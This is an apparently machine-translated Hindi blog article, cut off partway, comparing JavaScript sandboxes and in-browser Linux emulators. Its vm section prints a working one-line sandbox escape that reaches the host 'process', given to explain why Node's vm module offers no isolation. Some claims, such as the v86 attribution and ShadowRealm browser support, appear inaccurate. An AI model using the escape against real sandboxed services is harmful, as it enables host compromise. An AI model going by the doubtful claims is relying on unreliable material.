---
title: Linux कर्नल अनुकरण के लिए JavaScript समाधानों की तुलना
description: JavaScript/TypeScript में Linux वातावरण पुनर्निर्माण का गहन विश्लेषण।
date: 2026-05-28
tags:
  - javascript
  - linux
  - analysis
authors:
  - fox3000foxy
author_pubkey: "MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEoFS9I15CAZojXYc6NMqggEYGct9o9b3JnWdXWOtlzgs2lclmqw8adtWgXUeeBMRHvm5LoajQ+OcImaAyA8jwYA=="
author_sig: "ph2PZaSTTy15TrGxOIYCYUMFwu97b4exYwM/jCA7+uNRjyoEfXI+Ju8JSUy65p1wwhe5WiFdVnvbt+h1BUZl/w=="
---

# हर JavaScript sandbox, emulator, simulator और Linux honeypot, तुलना सहित

अच्छा, तो मैं इस खरगोश बिल में काफी अंदर हूँ। सब शुरू हुआ क्योंकि मैं [typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container) पर मदद कर रहा था, Fortune का प्रोजेक्ट (इस पर तुरंत लौटता हूँ), और मुझसे हर समय पूछा जाता था "रुको, `v86` से क्या अंतर है ?" या "क्यों न `vm2` इस्तेमाल किया जाए ?" , और मुझे एहसास हुआ कि मैं पूरा पारिस्थितिकी तंत्र map किए बिना स्पष्ट उत्तर नहीं दे सकता। तो खैर, हम यहाँ हैं शायद।

पता चलता है कि चार अलग परिवार हैं, JS sandbox, Linux emulator, Linux simulator, और honeypot, और वे लगभग कभी overlap नहीं करते, भले ही उनका लगातार एक ही वाक्य में उल्लेख होता है। कोई जो plugin तंत्र बनाता है वह `isolated-vm` इस्तेमाल करता है। कोई जो CLI उपकरण डेमो बनाता है वह `v86` इस्तेमाल करता है। कोई जो SSH खतरा खुफिया करता है वह Cowrie इस्तेमाल करता है। वे "बॉक्स में कोड चलाने" की एक ही अस्पष्ट छतरी के नीचे पूरी तरह अलग समस्याएँ सुलझाते हैं।

मैंने यह लेख लिखने के लिए स्रोत कोड, CVE रिपोर्ट, आर्किटेक्चर doc और npm पेज पढ़ने में बहुत समय बिताया। यह लंबा होगा, कॉफी लो, गंभीरता से। या दो।

> छोटा disclaimer : `typescript-virtual-container` इस लेख में प्रमुख है क्योंकि यही है जिसने यह शोध trigger किया। मैंने बाकी सब के प्रति निष्पक्ष होने की कोशिश की, लेकिन यह संदर्भ ध्यान में रखो।

---

## भाग 0 , पहले, तुम असल में कौन सी समस्या सुलझा रहे हो ?

गोता लगाने से पहले, हर परिवार की उपयोगिता पर सटीक होना उचित है, क्योंकि शब्दावली जल्दी गड़बड़ होती है और लोग लगातार सब मिलाते हैं (मैं सहित, इससे पहले कि मैं बैठकर सब साफ map करूँ)।

**JS sandbox** host Node.js प्रक्रिया से JavaScript कोड अलग करते हैं। खतरा मॉडल है : अविश्वसनीय JS कोड जो `process.exit()` बुला सकता है, फाइलें पढ़ सकता है, या child प्रक्रिया चला सकता है। समाधान V8 निष्पादन के चारों ओर सीमा है। इन उपकरणों की Linux shell, अनुमतियों वाले filesystem, या SSH की कोई धारणा नहीं है।

**Linux emulator** JavaScript या WebAssembly में लागू CPU emulator (x86, RISC-V, OR1K) में असली अपरिवर्तित Linux कर्नल चलाते हैं। तुम असली OS boot करते हो। तुम्हें असली तंत्र कॉल मिलते हैं। तुम्हें x86 के लिए संकलित प्रोग्रामों से binary संगतता मिलती है। संसाधन लागत बहुत बड़ी है।

**Linux simulator** असली कर्नल चलाए बिना Linux तंत्र के *व्यवहार* की नकल करते हैं। वे shell दुभाषिया, आभासी filesystem, और कार्यक्रमों और मानवों को धोखा देने को पर्याप्त Unix अर्थ लागू करते हैं। बिना कर्नल, बिना Wasm, बिना CPU emulation। काफी कम संसाधन।

**honeypot** हमलावरों को आकर्षित करने और वे क्या करते हैं यह दर्ज करने के लिए डिजाइन किए हैं। ये मुख्यतः निष्पादन वातावरण नहीं हैं, ये अवलोकन उपकरण हैं। असली Linux व्यवहार निष्ठा सिर्फ उस हद तक मायने रखती है जहाँ वह हमलावर को जाल पहचानने से रोकती है।

इस ढाँचे के साथ, इस लेख का हर प्रोजेक्ट यहाँ स्थित है :

```
JS sandbox :       vm, vm2, isolated-vm, quickjs-emscripten, Deno Workers, ShadowRealm
Linux emulator :  v86, JSLinux/TinyEMU, jor1k, CheerpX, WebContainers, container2wasm
Linux simulator : typescript-virtual-container (इस स्थान में अनोखा)
Honeypot :         Cowrie, Kippo, Lyrebird, endlessh, sshesame, node-simple-ssh-honeypot
Terminal stack :   xterm.js + node-pty (isolator नहीं, लेकिन संबंधित)
```

---

## भाग 1 , JavaScript sandbox

### 1.1 `vm` , Node.js का नेटिव मॉड्यूल (जो तुम सोचते हो वह नहीं)

Node में "अविश्वसनीय JS निष्पादित करना" का सबसे पुराना उत्तर नेटिव `vm` मॉड्यूल है। वह v0.1 से मौजूद है, इसलिए बहुत से लोग पहले उसे इस्तेमाल करते हैं, और जलते हैं।

```js
const vm = require("vm");
const sandbox = { answer: 0 };
vm.createContext(sandbox);
vm.runInContext("answer = 6 * 7", sandbox);
console.log(sandbox.answer); // 42
```

`vm` असल में क्या करता है : वह नया V8 संदर्भ बनाता है (नेटिव constructor का नया समुच्चय, `Object`, `Array`, `Function`, आदि) और उसमें कोड निष्पादित करता है, तुम जो `sandbox` में रखते हो उसका साझा संदर्भ लेकर। तुम्हारा V8 इंजन नहीं बदलता। तुम्हारी प्रक्रिया नहीं बदलती। स्मृति साझा है।

कारण कि `vm` कोई सुरक्षा नहीं देता : JavaScript prototype शृंखला DAG है जो सब कुछ `Object.prototype` से जोड़ता है। अगर तुम host दुनिया का ऑब्जेक्ट sandbox में रखते हो, तो मेहमान अपनी prototype शृंखला चढ़ सकता है और host constructor तक पहुँच सकता है। `Function` से, तुम `Function("return process")()` बुला सकते हो और असली `process` ले सकते हो। Game over। जैसे, तुरंत।

```js
// यह vm में पूरी तरह काम करता है, तुम्हें असली process मिलता है
vm.runInNewContext(`({}).__proto__.constructor("return process")()`);
```

मेरा मतलब, Node.js दस्तावेज खुद कहता है : "vm मॉड्यूल सुरक्षा तंत्र नहीं है। अविश्वसनीय कोड निष्पादित करने के लिए इसका उपयोग मत करो।" यह चेतावनी हमेशा से वहाँ है। लोग लगातार नजरअंदाज करते हैं। मैंने production application देखे हैं जो `vm` को sandbox की तरह इस्तेमाल करते हैं। कृपया, ऐसा मत करो।

**निर्णय** : दायरा तंत्र, sandbox नहीं। इसका उपयोग करो जब तुम्हें चर अलग करने हों (template इंजन, `eval` तरह की सुविधाएँ जहाँ तुम कोड नियंत्रित करते हो)। अविश्वसनीय input के लिए कभी नहीं।

**स्मृति** : नगण्य overhead , host प्रक्रिया वाला V8 heap।
**सुरक्षा** : प्रेरित हमलावर के खिलाफ कोई नहीं।

---

### 1.2 `vm2` , सामुदायिक प्रयास, और उसकी बहुत लंबी मौत

`vm2` `vm` पलायन समस्या का सामुदायिक उत्तर था। केंद्रीय विचार : sandbox सीमा पार करने वाले हर ऑब्जेक्ट को `Proxy` में लपेटना जो गुण पहुँच रोकता है, prototype चढ़ाई रोकता है, और खतरनाक संदर्भ छाँटता है। सिद्धांत में बुद्धिमान विचार ! व्यवहार में, परिणाम काफी कम आश्वस्त निकला, जैसा हम देखेंगे।

```js
const { VM } = require("vm2");
const vm = new VM({ timeout: 1000, sandbox: {} });
vm.run("process.exit(1)"); // VMError फेंकता है, process अपहुँच योग्य
```

कई सालों तक, यह ठीक काम करता था। लेकिन JavaScript `Proxy` हमला सतह बहुत बड़ी है। JS भाषा की हर नई सुविधा, generator, अतुल्यकालिक iterator, `Symbol.toPrimitive`, `Error.prepareStackTrace`, `Promise` आंतरिक slot, संभावित दरकिनार वाहक है।

CVE कालक्रम... कुछ है। जैसे, यह देखो :

| तिथि | CVE | तंत्र |
|------|-----|-----------|
| अक्टूबर 2022 | CVE-2022-36067 | `Error.prepareStackTrace` से host संदर्भ पलायन |
| अप्रैल 2023 | CVE-2023-29017 | अनियंत्रित async त्रुटि से host ऑब्जेक्ट रिसाव |
| अप्रैल 2023 | CVE-2023-29199 | `handleException()` से अपवाद स्वच्छता दरकिनार |
| अप्रैल 2023 | CVE-2023-30547 | `Proxy.getPrototypeOf` → `Function` → RCE |
| मई 2023 | CVE-2023-32314 | `Error.name` पर `Proxy` → `Function` → RCE |
| जुलाई 2023 | CVE-2023-37466 | Async फंक्शन + stack overflow + `Proxy.getPrototypeOf` |
| जुलाई 2023 | CVE-2023-37903 | Worker thread + eval पलायन |

उसी महीने (अप्रैल 2023) तीन महत्वपूर्ण CVE। तीन। एक महीने में। CVE-2023-37903 बाद, maintainer ने आधिकारिक लाइब्रेरी अवमूल्यित की संदेश के साथ : *"लाइब्रेरी में महत्वपूर्ण सुरक्षा समस्याएँ हैं और production में इस्तेमाल नहीं होनी चाहिए।"*

maintainer ने अक्टूबर 2025 में संस्करण 3.10.0 से उसे पुनर्जीवित किया, दावा करते हुए कि उस समय ज्ञात सब सुधारा गया था। नया महत्वपूर्ण पलायन (CVE-2026-22709, CVSS 9.8) जनवरी 2026 में प्रकट हुआ, मई 2026 में ग्यारह और का lot उसके बाद। ग्यारह। pattern नहीं बदला और ईमानदारी से मुझे नहीं लगता वह कभी बदलेगा।

मौलिक समस्या आर्किटेक्चरल है, और यह वह सबक है जिसे सीखने में पूरे पारिस्थितिकी तंत्र को समय लगा। तुम उसी भाषा से सुरक्षित sandbox नहीं बना सकते जिसे तुम अलग करते हो, उसी इंजन पर, उसी प्रक्रिया में। पलायन सतह संपूर्ण V8 कार्यान्वयन है, और V8 C++ की कई मिलियन पंक्तियाँ करता है जो लगातार बदलती हैं। हर नई JS सुविधा संभावित नया हमला रास्ता खोलती है।

**निर्णय** : सुरक्षा संवेदनशील application के लिए इस्तेमाल मत करो। नवीनतम संस्करण पर भी, हर कुछ महीनों में नए दरकिनार खोजे जाते हैं। maintainer खुद ने खुलेआम स्वीकार किया।

---

### 1.3 `isolated-vm` , वह जो सच में काम करता है

`isolated-vm` सही दृष्टिकोण अपनाता है : V8 की नेटिव अलगाव primitive, Isolate इस्तेमाल करना। हर V8 Isolate का अपना heap है, अपना कचरा संग्राहक, अपने नेटिव समुच्चय, और अन्य Isolate से शून्य साझा संदर्भ।

यह वही सीमा है जो Chrome tab के बीच इस्तेमाल करता है। यह असली सुरक्षा बाधा है, Proxy पर बनी भाषा चाल नहीं।

```js
import ivm from "isolated-vm";

// हर isolate अपना V8 heap है
const isolate = new ivm.Isolate({ memoryLimit: 64 }); // MB में सीमा
const context = await isolate.createContext();
const jail = context.global;

// सीमा पार डेटा भेजने के लिए स्पष्ट क्रमबद्धता चाहिए
await jail.set("sensitiveData", "not this");
await jail.set("log", new ivm.Reference(console.log));

const script = await isolate.compileScript(`
  // host प्रक्रिया, host heap या host मॉड्यूल नहीं पहुँच सकता
  log.applySync(undefined, ["hello from the isolate"]);
`);
await script.run(context);

// तुम timeout या स्मृति सीमा पर क्रूर समाप्त कर सकते हो
isolate.dispose(); // पूरा heap मुक्त करता है
```

`Reference` और `ExternalCopy` प्रकार स्पष्ट संचार सेतु हैं। `Reference` isolate को host फंक्शन का बुलाने योग्य handle देता है, isolate उसे बुला सकता है लेकिन उसके closure या prototype निरीक्षण नहीं कर सकता। `ExternalCopy` मान (संरचित clone) heap सीमा पार क्रमबद्ध करता है। यह स्पष्ट सेतु मॉडल व्यावहारिक नहीं है, लेकिन यही अलगाव असली बनाता है।

तुम कड़े संसाधन सीमाएँ तय कर सकते हो : स्मृति (isolate समाप्त होता है अगर वह सीमा पार करता है), दीवार घड़ी timeout, और CPU timeout। समाप्ति असली है, वह पूरा V8 Isolate मारती है, सिर्फ JS timeout नहीं जिसे `while(true)` से दरकिनार किया जा सकता है।

**सीमाएँ** : यह सिर्फ JS है। तुम इसमें bash निष्पादित नहीं कर सकते। फाइलों, अनुमतियों, नेटवर्क या प्रक्रिया की कोई धारणा नहीं है। यह उपयोगकर्ता प्रस्तुत JS (plugin, सूत्र, script hook) के लिए बिल्कुल सही उपकरण है, और बाकी सब के लिए गलत उपकरण। `typescript-virtual-container` लेखिका ने उल्लेख किया कि उसने शुरुआत में इस पर विचार किया था इससे पहले कि महसूस करे कि "shell कमांड निष्पादित करना" और "JavaScript अलग करना" मौलिक अलग समस्याएँ हैं।

**स्मृति** : प्रति खाली isolate ~3-10 Mo, heap उपयोग से बढ़ती है।
**सुरक्षा** : ठोस। V8 Isolate सीमा असली अलगाव primitive है।
**npm** : [isolated-vm](https://www.npmjs.com/package/isolated-vm)
**GitHub** : [laverdet/isolated-vm](https://github.com/laverdet/isolated-vm)

---

### 1.4 `quickjs-emscripten` , Wasm में संकलित अलग JS इंजन

अलग दृष्टिकोण : V8 में अलग करने के बजाय, WebAssembly में संकलित पूरी तरह अलग JavaScript इंजन चलाना। host V8/Node में चलता है। मेहमान Wasm में QuickJS में चलता है। Wasm sandbox अलगाव सीमा देता है।

QuickJS Fabrice Bellard का और काम है (QEMU, FFmpeg, JSLinux, TinyEMU के पीछे वही आदमी, यह व्यक्ति वास्तविक नहीं है, गंभीरता से, एक ही व्यक्ति यह सब कैसे करता है ?)। यह C में लिखा ES2023 अनुरूप छोटा JS इंजन है, और Wasm में संकलित वह तुल्यकालिक रूप के लिए सिर्फ लगभग 500 Ko करता है।

```js
import { getQuickJS } from "quickjs-emscripten";

const QuickJS = await getQuickJS();
const vm = QuickJS.newContext();

const result = vm.evalCode(`
  // QuickJS में चलता है, V8 से पूरी तरह अलग
  (function() { return 6 * 7; })()
`);

if (result.error) {
  console.log("Error:", vm.dump(result.error));
  result.error.dispose();
} else {
  console.log("Result:", vm.dump(result.value)); // 42
  result.value.dispose();
}

vm.dispose();
```

QuickJS ES2023 अनुरूप छोटा JavaScript इंजन है जो C में लिखा है। Wasm में संकलित, वह तुल्यकालिक रूप के लिए लगभग 500 Ko करता है, अतुल्यकालिक रूप (Asyncify) के लिए ~1 Mo। स्मृति प्रबंधन मैन्युअल है, VM से निकालने वाला हर मान स्पष्ट मुक्त होना होगा, जो थोड़ा कष्टप्रद है लेकिन सीमा पार GC आश्चर्य रोकता है। मजेदार समझौता !

`@sebastianwessel/quickjs` wrapper ऊपर ज्यादा ergonomic API जोड़ता है, वैकल्पिक आभासी filesystem, fetch समर्थन, और Node.js मॉड्यूल stub के साथ :

```ts
import variant from "@jitl/quickjs-ng-wasmfile-release-sync";
import { loadQuickJs } from "@sebastianwessel/quickjs";

const { runSandboxed } = await loadQuickJs(variant);

const result = await runSandboxed(
  async ({ evalCode }) => evalCode(`
    import { join } from 'path';
    export default join('src', 'dist');
  `),
  { allowFs: false, allowFetch: false }
);
```

सुरक्षा मॉडल `isolated-vm` से अलग है : Wasm रैखिक स्मृति मॉडल से मेहमान सीधे V8 heap ऑब्जेक्ट नहीं पहुँच सकता। हमला सतह host↔Wasm इंटरफेस (imports/exports) है, पूरी JS भाषा नहीं। यह आमतौर पर Proxy आधारित sandbox से ज्यादा मजबूत माना जाता है।

उल्टा : QuickJS में V8 जैसा अनुकूलन स्तर नहीं है। CPU-bound JS भार के लिए, यह V8 से 5 से 20 गुना धीमा है। कोड के छोटे टुकड़ों और अविश्वसनीय मूल्यांकन के लिए, इसका आमतौर पर महत्व नहीं है।

**स्मृति** : ~500 Ko Wasm मॉड्यूल + प्रति उदाहरण heap।
**सुरक्षा** : Wasm सीमा, Proxy दृष्टिकोणों से ज्यादा ठोस मानी जाती है।
**npm** : [quickjs-emscripten](https://www.npmjs.com/package/quickjs-emscripten), [@sebastianwessel/quickjs](https://www.npmjs.com/package/@sebastianwessel/quickjs)
**GitHub** : [justjake/quickjs-emscripten](https://github.com/justjake/quickjs-emscripten)

---

### 1.5 Deno , runtime जो अनुमतियाँ पहले रखता है

Deno पूरी तरह अलग दर्शन अपनाता है : Node में sandbox करने के बजाय, नया runtime बनाना जो डिफ़ॉल्ट सुरक्षित है। मुझे यह दृष्टिकोण सच में पसंद है, Node.js को शुरू से यही होना चाहिए था, ईमानदारी से। Ryan Dahl (Node.js के मूल निर्माता) ने सचमुच Deno बनाया क्योंकि उसे Node.js के कुछ डिजाइन निर्णयों पर पछतावा था, जो काफी पागल है जब इसके बारे में सोचते हो।

हर संवेदनशील क्षमता (फाइल पढ़ना, फाइल लिखना, नेटवर्क, वातावरण, उप प्रक्रिया) को स्पष्ट `--allow-*` flag चाहिए :

```bash
# यह सिर्फ /data में पढ़ सकता है, कुछ और नहीं
deno run --allow-read=/data script.ts

# यह सिर्फ एक ही domain पहुँच सकता है
deno run --allow-net=api.example.com script.ts

# कोई flag नहीं = कोई अनुमति नहीं
deno run untrusted.ts # पढ़, लिख, नेटवर्क, चला नहीं सकता
```

अनुमति मॉडल Rust/OS स्तर पर लागू है, यह JS चाल नहीं है। जब Deno कोड `Deno.readFile()` बुलाता है, तो यह Rust ऑपरेशन से गुजरता है जो filesystem छूने से पहले अनुमति तालिका जाँचता है। तुम इसे JS से दरकिनार नहीं कर सकते क्योंकि अनुमति न होने पर तंत्र कॉल कभी नहीं होता।

सच में अविश्वसनीय कोड निष्पादित करने के लिए, Deno Worker (Web Worker) उसी प्रक्रिया में दूसरा isolate देते हैं, हर एक अपने अनुमति समुच्चय के साथ। तुम शून्य अनुमति वाला worker चला सकते हो और `postMessage` से उससे संवाद कर सकते हो।

Deno 2 (अक्टूबर 2024 निकला) ने पूर्ण npm संगतता और Node.js संगतता shim जोड़े, जिसने serveur उपयोग मामलों के लिए अपनाना काफी सुधारा।

**समझौता** : Deno सुरक्षा मॉडल उस कोड के लिए उत्कृष्ट है जिस पर तुम आंशिक भरोसा कर सकते हो। पूरी तरह अविश्वसनीय कोड के लिए जो विरोधी हो सकता है, अनुमति मॉडल मदद नहीं करता, तुम्हें Isolate सीमा (`isolated-vm`) या अलग इंजन (`quickjs-emscripten`) चाहिए, क्योंकि Deno अभी V8 इस्तेमाल करता है और परिष्कृत हमलावर V8 स्तर bug पा सकते हैं।

---

### 1.6 TC39 ShadowRealm , मानकीकृत उत्तर (एक दिन)

JavaScript मानकीकरण निकाय (TC39) के पास ShadowRealm नामक प्रस्ताव है जो `vm` और `vm2` करने की कोशिश को मानकीकृत करने का प्रयास करता है, लेकिन सही सुरक्षा मॉडल के साथ। ShadowRealm अपने intrinsic के साथ अलग JS निष्पादन संदर्भ बनाता है, बाहरी realm पहुँच नहीं, और सावधानी नियंत्रित आयात/निर्यात इंटरफेस।

```js
const realm = new ShadowRealm();
const result = realm.evaluate(`
  // अलग Intrinsic, बाहरी realm पहुँच नहीं
  typeof globalThis.fetch // "undefined"
  6 * 7 // 42
`);
```

ShadowRealm ब्राउजरों में उपलब्ध है (Chrome 90+, Firefox 105+) लेकिन 2026 में स्थिर Node.js में अभी नहीं है। TC39 Compartments प्रस्ताव मॉड्यूल स्तर अलगाव के लिए इस पर बनता है। ये दीर्घकालिक मानकीकृत उत्तर हैं, लेकिन वे Node serveur तरफ production के लिए अभी तैयार नहीं हैं। यह उन कामों में से एक है जिसे तुम दूर से आते देखते हो लेकिन... यह बस अभी वहाँ नहीं है। क्लासिक TC39।

---

### sandbox परिवार सारांश

| | `vm` | `vm2` | `isolated-vm` | `quickjs-emscripten` | Deno Workers |
|---|---|---|---|---|---|
| **अलगाव सीमा** | कोई नहीं (दायरा) | Proxy (टूटा) | V8 Isolate | Wasm | V8 Isolate + Rust अनुमतियाँ |
| **स्मृति सीमा** | ❌ | ❌ | ✅ कड़ी सीमा | ✅ Wasm heap | आंशिक |
| **CPU Timeout** | ❌ | ✅ (दरकिनार योग्य) | ✅ कड़ा | ✅ | ✅ |
| **सुरक्षा** | कोई नहीं | टूटी | ठोस | ठोस | ठोस |
| **JS गति** | नेटिव V8 | नेटिव V8 | नेटिव V8 | ~10x धीमा | नेटिव V8 |
| **ब्राउज़र** | ❌ | ❌ | ❌ | ✅ | ❌ |
| **Node संगतता** | नेटिव | ✅ | ✅ | आंशिक shim | आंशिक |
| **स्थिति** | स्थिर | जोखिम भरा (नए CVE) | ✅ सक्रिय | ✅ सक्रिय | ✅ सक्रिय |
| **RAM overhead** | ~1 Mo | ~5-20 Mo | ~3-10 Mo | ~5-15 Mo | ~10-30 Mo |

निर्णय : अगर सुरक्षा तुम्हारे लिए मायने रखती है, तो बिल्कुल दो असली विकल्प हैं, `isolated-vm` (नेटिव एक्सटेंशन, V8 Isolate, पूर्ण JS गति) और `quickjs-emscripten` (Wasm, ब्राउज़र संगत, गहन गणना के लिए ~10x धीमा)। बाकी सब या तो "कृपया ऐसा मत करो" (`vm`, `vm2`) है या runtime जो पूरी तरह अलग समस्या सुलझाता है (Deno)। ShadowRealm एक दिन खेल बदल सकता है, लेकिन अभी नहीं।

---

## भाग 2 , JavaScript में Linux emulator

यहीं चीजें मेरे लिए सच में दिलचस्प होती हैं। ये *असली* emulator हैं, वे JavaScript या WebAssembly में निर्देश समुच्चय लागू करते हैं, असली Linux कर्नल छवि boot करते हैं, और असली उपयोगकर्ता binary निष्पादित करते हैं। अलगाव इस तथ्य से आता है कि मेहमान और host कुछ साझा नहीं करते : अलग स्मृति स्थान, अलग निर्देश प्रवाह।

चुकाई कीमत बहुत बड़ी है, लेकिन जो तुम पाते हो वह सच में उल्लेखनीय है : असली Linux, जो सच में चलता है, तुम्हारे ब्राउज़र या Node प्रक्रिया में। जैसे, जब इसके बारे में सोचते हो तो काफी पागल है, है ना ?

### 2.1 `v86` , JS + JIT Wasm में x86 PC emulator

Fabrice (GitHub पर copy) का `v86` JavaScript में सबसे सक्षम ओपन सोर्स x86 emulator है। वह 2013 के आसपास शुद्ध JS दुभाषिया के रूप में शुरू हुआ और JIT तंत्र की ओर विकसित हुआ जहाँ x86 बुनियादी ब्लॉक तुरंत WebAssembly में अनुवाद होते हैं, प्रदर्शन काफी सुधारते हुए।

वह क्या अनुकरण करता है :
- **CPU** : x86-32 (IA-32), लगभग Pentium 1 स्तर निर्देश समुच्चय। 64-बिट (x86-64) बाहर रहता है, यह हार्डवेयर आर्किटेक्चरल सीमा है, छूटी सुविधा नहीं।
- **FPU** : JavaScript `Float64Array` से। x87 80-बिट विस्तारित सटीकता में है ; JS double 64-बिट में हैं। इसका मतलब है कि चल बिंदु परिणाम असली CPU से थोड़े भिन्न हो सकते हैं।
- **स्मृति** : कॉन्फ़िगर करने योग्य, JS heap में `SharedArrayBuffer` या `ArrayBuffer` से map होती है।
- **हार्डवेयर** : 8254 PIT (timer), 8259 PIC (बाधा नियंत्रक), 8042 keyboard नियंत्रक (PS/2), CMOS RTC, SVGA विस्तार और Bochs VBE वाला VGA, IDE नियंत्रक, floppy नियंत्रक (8272A), NE2000 नेटवर्क कार्ड।
- **BIOS** : SeaBIOS (ओपन सोर्स x86 BIOS) इस्तेमाल करता है।

JIT बुनियादी ब्लॉक पहचानकर (बिना छलांग x86 निर्देश अनुक्रम), उन्हें WebAssembly फंक्शन में अनुवाद करके, इस फंक्शन को cache करके, और उसी ब्लॉक के अगले निष्पादन पर उसे बुलाकर काम करता है। गर्म कोड रास्ते नेटिव Wasm प्रदर्शन पाते हैं। ठंडे रास्ते JS दुभाषिया पर लौटते हैं।

```js
import { V86 } from "v86";
import { readFileSync } from "fs";

const emulator = new V86({
  bios:    { buffer: readFileSync("./bios/seabios.bin") },
  vga_bios:{ buffer: readFileSync("./bios/vgabios.bin") },
  hda:     { buffer: readFileSync("./images/alpine.img"), async: false },
  memory_size: 128 * 1024 * 1024, // 128 Mo
  autostart: true,
});

// क्रमिक output पकड़ना (Linux कर्नल console)
emulator.add_listener("serial0-output-byte", byte => {
  process.stdout.write(String.fromCharCode(byte));
});

// मेहमान को input भेजना (shell में टाइप करना)
emulator.serial0_send("ls /\n");
```

**समर्थित OS** : Alpine Linux (उत्कृष्ट), Ubuntu 16.04/18.04 (सिर्फ i386), Arch Linux 32, ReactOS, FreeDOS, Windows 9x/2000 (आरक्षण के साथ), MS-DOS।

**boot समय** : साफ छवि से Alpine Linux के लिए 15-40 सेकंड। यह असली कर्नल आरंभीकरण में निहित है, तुम इसे छोड़ नहीं सकते। हाँ, तुम्हारे उपयोगकर्ता अपने ब्राउज़र में Linux कर्नल boot देखते रहेंगे। यही deal है।

**न्यूनतम स्मृति** : प्रति उदाहरण 100-256 Mo। अकेला Wasm JIT कोड cache व्यस्त Linux उदाहरण के लिए दसियों Mo पहुँच सकता है।

**Node.js में उपयोग** : पूरी तरह समर्थित। DOM अनावश्यक रहता है, VGA output नजरअंदाज किया जा सकता है अगर तुम्हें सिर्फ क्रमिक output में रुचि है।

**जो तुम नहीं कर सकते** : 64-बिट binary निष्पादित करना, आधुनिक कर्नल सुविधाएँ इस्तेमाल करना (eBPF, io_uring, आदि), या स्मृति सीमा पहुँचे बिना एक साथ मुट्ठी से ज्यादा उदाहरण चलाना।

**npm** : [v86](https://www.npmjs.com/package/v86) , लगातार अद्यतन, मैं लिखता समय उसी दिन अंतिम प्रकाशन।
**GitHub** : [copy/v86](https://github.com/copy/v86)
**डेमो** : [copy.sh/v86](https://copy.sh/v86)

---

### 2.2 JSLinux और TinyEMU , Bellard काम, दो बार में

JSLinux Fabrice Bellard का खुद का JavaScript Linux emulator है, सबसे पहला, 2011 प्रकाशित। मैं इस लेख में Bellard उल्लेख जारी रखता हूँ क्योंकि वह बार बार प्रकट होता रहता है : QuickJS, TinyEMU, JSLinux, QEMU, FFmpeg। यह आदमी कुछ और है। सच में software इतिहास के सबसे प्रभावशाली व्यक्तिगत तकनीकी योगदानों में से एक, बिना अतिशयोक्ति।

मूल JSLinux शुद्ध JS x86 दुभाषिया था। 2016 में, Bellard ने TinyEMU लिखा (C में RISC-V emulator), उसे Emscripten से JavaScript में संकलित किया, और वह वर्तमान JSLinux आधार बना। इसलिए वर्तमान JSLinux असल में C कोड है जो JavaScript बनाता है, बिल्कुल हाथ से लिखा JS नहीं।

Bellard साइट पर तकनीकी नोट पढ़ने योग्य हैं : वर्तमान JSLinux 32 या 64-बिट RISC-V CPU (x86 नहीं) चलाता है, VirtIO console, VirtIO नेटवर्क, VirtIO ब्लॉक परिधीय, और host से फाइल साझा करने के लिए 9P filesystem अनुकरण करता है। JS डेमो Emscripten इस्तेमाल करके C से संकलित है, यह हाथ से लिखा JS नहीं है।

TinyEMU खुद समर्थन करता है :
- RISC-V RV32IMAFDQC और RV64IMAFDQC (32 और 64-बिट, चल बिंदु, गुणा, संपीड़ित निर्देशों के साथ)
- KVM से x86 (सिर्फ नेटिव, emulation नहीं, इसलिए JS संस्करण सिर्फ RISC-V है)
- VirtIO Console, नेटवर्क, ब्लॉक, input, 9P filesystem

TinyEMU के पास Emscripten से दी JavaScript डेमो है। यह JSLinux आधार है और `container2wasm` भी इस्तेमाल करता है (खंड 2.5 देखो)।

**JSLinux स्थिति** : कोई npm पैकेज नहीं, कोई प्रोग्राम करने योग्य API नहीं। यह डेमो है जो तुम अपने ब्राउज़र में खोलते हो। ऐतिहासिक महत्व बड़ा है, इसने अवधारणा साबित की। लाइब्रेरी के रूप में व्यावहारिक उपयोगिता : शून्य।

**TinyEMU** : npm पर नहीं, C स्रोत [bellard.org/tinyemu](https://bellard.org/tinyemu/) पर उपलब्ध।

---

### 2.3 jor1k , OR1K emulator

jor1k Sebastian Macke लिखा OpenRISC 1000 (OR1K) emulator है। यह ऐतिहासिक दिलचस्प है क्योंकि jor1k ने VirtIO 9P filesystem समर्थन लाया, जिसे Bellard ने फिर TinyEMU और JSLinux में एकीकृत किया। इन प्रोजेक्टों के बीच cross-pollination कसा है, वे सब एक दूसरे से विचार उधार लेते हैं, जो ईमानदारी से ओपन सोर्स emulation काम की सबसे अच्छी चीजों में से एक है।

**स्थिति** : सक्रिय बनाए नहीं रखा जाता, कोई npm पैकेज नहीं। इस स्तर पर अभिलेखित। जानने के लिए खासकर ऐतिहासिक संदर्भ उपयोगी, जैसे अगर कोई बातचीत में jor1k उल्लेख करता है, तो अब तुम जानते हो यह क्या है :)

---

### 2.4 CheerpX , ब्राउज़र के लिए वाणिज्यिक x86 emulator

Leaning Technologies का CheerpX production गुणवत्ता वाला वाणिज्यिक Linux x86 emulator है। वह ओपन सोर्स नहीं है, लेकिन असली Debian/Ubuntu userspace चलाने के लिए v86 से स्पष्ट ज्यादा सक्षम है। अगर तुम्हें ब्राउज़र में असली VSCode चाहिए, तो तुम्हें यही चाहिए।

v86 से मुख्य अंतर :
- व्यापक ISA समर्थन (ज्यादा x86 विस्तार, बेहतर glibc संगतता)
- ब्राउज़र में IndexedDB आधारित filesystem (पेज reload के बीच स्थायी)
- `SharedArrayBuffer` से pthread समर्थन (जिसे COOP/COEP हेडर चाहिए, हाँ वे कष्टप्रद सुरक्षा हेडर)
- असली application चलाने के लिए डिजाइन, VSCode, Python, Node.js, और अन्य असली application, सिर्फ न्यूनतम OS छवियाँ नहीं
- पेशेवर समर्थन और SLA उपलब्ध (यानी टूटने पर तुम किसी को डाँट सकते हो)

ठेठ उपयोग मामला है "बिना serveur ब्राउज़र में असली Linux application चलाना।" कंपनियाँ इसे ब्राउज़र आधारित IDE, कोडिंग ट्यूटोरियल, और इंटरैक्टिव दस्तावेज के लिए इस्तेमाल करती हैं।

```js
// CheerpX API (सरलीकृत)
const cx = await CheerpX.Linux.create({
  mounts: [{ type: "ext2", path: "/", dev: CloudDevice.create(...) }],
});
await cx.run("/bin/bash");
```

**Node.js कहानी** : CheerpX पहले ब्राउज़र के लिए डिजाइन है। अंतर्निहित emulator सैद्धांतिक Node में काम कर सकता है (यह Wasm है), लेकिन API और दस्तावेज पूरी तरह ब्राउज़र उपयोग उन्मुख हैं। serveur तरफ उपयोग समर्थित नहीं है।

**स्मृति** : v86 जैसा, असली Debian उदाहरण के लिए 200+ Mo।
